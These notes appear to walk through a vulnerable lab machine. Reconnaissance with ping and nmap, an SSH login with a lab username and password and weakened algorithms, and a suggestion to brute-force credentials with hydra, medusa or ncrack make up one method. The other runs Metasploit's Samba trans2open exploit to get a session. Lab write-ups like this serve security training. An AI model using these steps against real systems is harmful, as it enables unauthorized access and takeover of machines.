user - john , password - TwoCows2

```bash
ping <target-ip-addr> # success = '0' packet loss 
```
- do the nmap scan 
```bash
nmap -A <target-ip-addr>
```
- after nmap , we got to know ssh is running on *port 22* 
- so let's try to connect to the target machine 
```bash
ssh -o KexAlgorithms=+diffie-hellman-group1-sha1 -o HostKeyAlgorithms=+ssh-rsa -o Ciphers=+aes128-cbc john@<target-ip-addr>
```
- it gives a RSA key fingerprint , something like this --> `RSA key fingerprint is: SHA256:VDo/h/SG4A6H+WPH3LsQqw1jwjyseGYq9nLeRWPCY/A` 
- then asks for --> `Are you sure you want to continue connecting (yes/no/[fingerprint])?` | say "yes" 
- type the password "TwoCows2" 
- and you are connected to the machine 
- if you are wondering , how can i know the password and username | try to crack the ssh via 'ncrack' , 'medusa' , 'hydra' | use tool of your liking and find the credentials , i leave this thing upto you 
---
# Method -2 
```bash
msfconsole
search auxiliary/scanner/smb/smb_version
# set rhosts <target-ip-addr>
exploit 
# you will find samba version running on the target machine 
```

- now we'll exploit this service and own the target machine 
```bash
search exploit/linux/samba/trans2open 
use exploit/linux/samba/trans2open
# set rhosts , lport 
exploit
# is successful you will see a session open 
```